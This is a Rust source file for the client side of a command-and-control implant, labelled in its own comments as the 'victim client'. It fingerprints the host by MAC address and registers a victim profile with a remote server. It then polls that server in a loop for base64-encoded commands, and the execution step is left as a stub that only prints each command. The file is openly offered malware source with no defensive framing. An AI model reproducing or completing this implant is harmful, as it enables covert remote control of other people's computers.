// Include our profile.rs, generated by the build script
include!(concat!(env!("OUT_DIR"), "/profile.rs"));

use base64::engine::{general_purpose::STANDARD as b64, Engine};
use mac_address::get_mac_address;
use reqwest::{
    self as rq,
    header::{HeaderMap, HeaderValue},
    StatusCode as st,
};
use serde::{Deserialize, Serialize};
use std::{process, thread, time::Duration};

pub async fn run() {
    // Initializing variables from Profile JSON.
    let config = Config::new();
    let server_cmds = ServerCommands::new();
    let endpoints = EndPoints::new();

    // Get our client
    let client = get_client(config.token);

    // Register
    register(&client, &endpoints.register).await;

    // Mainloop
    let session_id = loop {
        let get_session = client.get(&endpoints.get_session).send().await.unwrap();

        if get_session.status() == st::OK {
            break get_session.text().await.unwrap();
        }

        sleep(5);
    };

    println!("session_id: {}", session_id);
    loop {
        let command = loop {
            let cmd_res = client
                .get(&endpoints.fetch_cmd)
                .body(session_id.clone())
                .send()
                .await
                .unwrap();

            if cmd_res.status() == st::OK {
                let res_string = cmd_res.text().await.unwrap();
                break Some(String::from_utf8(b64.decode(&res_string).unwrap()).unwrap());
            } else if cmd_res.status() == st::GONE {
                // Session has been killed, so let's get out
                break None;
            }
            sleep(2);
        };

        if let None = command {
            break;
        }

        // Command execution
        println!("Command: {}", command.unwrap());
    }
}

pub fn get_client(token: &str) -> rq::Client {
    // The mac-address of the machine that is used as the ID of the machine.
    let client_id = match get_mac_address() {
        Ok(Some(mc_address)) => mc_address,
        _ => process::exit(1),
    };

    let mut headers = HeaderMap::new();
    headers.insert(
        "Authorization",
        HeaderValue::from_str(&format!("Basic {}", b64.encode(token.as_bytes()))).unwrap(),
    );
    headers.insert(
        "client-id",
        HeaderValue::from_str(&client_id.to_string()).unwrap(),
    );
    headers.insert("client-type", HeaderValue::from_static("2")); // 2 represents the victim client id

    // Let's first connect with the server
    rq::Client::builder()
        .default_headers(headers)
        .build()
        .unwrap()
}

#[derive(Serialize, Deserialize, Default)]
struct VictimSpecs {
    host_name: Option<String>,
    os: Option<String>,
    arch: Option<String>,
    cpu: Option<String>,
    ram: Option<u8>,
}

async fn register(client: &rq::Client, register_path: &str) {
    let victim_specs = VictimSpecs {
        host_name: Some("Bython17".to_string()),
        os: Some("MacOS".to_string()),
        arch: Some("x86_64".to_string()),
        cpu: Some("Intel Core i7".to_string()),
        ram: Some(8),
    };

    let status = client
        .post(register_path)
        .body(b64.encode(serde_json::to_value(victim_specs).unwrap().to_string()))
        .send()
        .await
        .unwrap()
        .status();

    if status == st::INTERNAL_SERVER_ERROR {
        panic!();
    }
}

// Convenience function
fn sleep(time: u32) {
    thread::sleep(Duration::from_secs(time.into()));
}
